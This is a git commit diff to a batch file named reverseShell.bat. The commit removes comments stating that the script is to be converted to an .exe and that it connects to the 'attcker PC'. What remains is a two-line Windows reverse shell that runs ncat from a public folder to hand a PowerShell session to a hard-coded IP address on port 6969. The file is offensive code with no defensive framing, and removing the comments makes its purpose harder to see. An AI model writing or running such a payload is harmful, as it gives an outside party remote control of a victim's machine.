1b131842cc0d0e4f21f4b3c37bc05113e07c6451
p1mpus <45327810+p1mpus@users.noreply.github.com>
2022-08-28 22:00:33 +0300

    Update reverseShell.bat

--- reverseShell.bat
+++ reverseShell.bat
@@ -1,3 +1,2 @@
-#This script has to be converted to .exe file
-cd C:\Users\Public\Documents\nmap\nmap-7.92 #Go to netcat directory
-./ncat 62.217.176.87 6969 -e powershell.exe #Connect to attcker PC
+cd C:\Users\Public\Documents\nmap\nmap-7.92
+./ncat 62.217.176.87 6969 -e powershell.exe
